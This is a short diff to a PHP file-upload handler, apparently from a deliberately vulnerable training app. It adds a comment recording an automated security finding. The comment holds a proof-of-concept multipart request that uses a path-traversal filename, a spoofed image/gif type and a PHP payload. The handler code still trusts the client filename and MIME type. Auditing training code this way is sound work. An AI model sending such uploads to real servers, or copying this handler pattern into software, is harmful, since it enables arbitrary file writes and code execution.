@@ -36,6 +36,26 @@
 				if(isset($_POST['upload'])) {
 					$destination = 'uploads/' . $_FILES['userfile']['name'];
 					if (in_array($_FILES['userfile']['type'], $valid_mime_types)) {
+						// TODO: AI issue #9, High, Unrestricted File Upload, https://github.com/rbm1718/bricks/issues/9
+						//
+						// POST /upload-2/index.php HTTP/1.1
+						// Host: localhost
+						// Accept-Encoding: identity
+						// Connection: close
+						// Content-Length: 307
+						// Content-Type: multipart/form-data; boundary=183c93b04ad54dd28bdb2d7bf3b9a014
+						//
+						// --183c93b04ad54dd28bdb2d7bf3b9a014
+						// Content-Disposition: form-data; name="upload"
+						//
+						// 935137890000
+						// --183c93b04ad54dd28bdb2d7bf3b9a014
+						// Content-Disposition: form-data; name="userfile"; filename="../../../../../../../../../../tmp/"
+						// Content-Type: image/gif
+						//
+						// <?php phpinfo(); ?>
+						// --183c93b04ad54dd28bdb2d7bf3b9a014--
+						//
 						move_uploaded_file($_FILES['userfile']['tmp_name'], $destination);
 						echo "<div class=\"alert-box success\">Upload succesful: <a href='$destination'>here</a><a href=\"\" class=\"close\">&times;</a></div>";
 					}else {
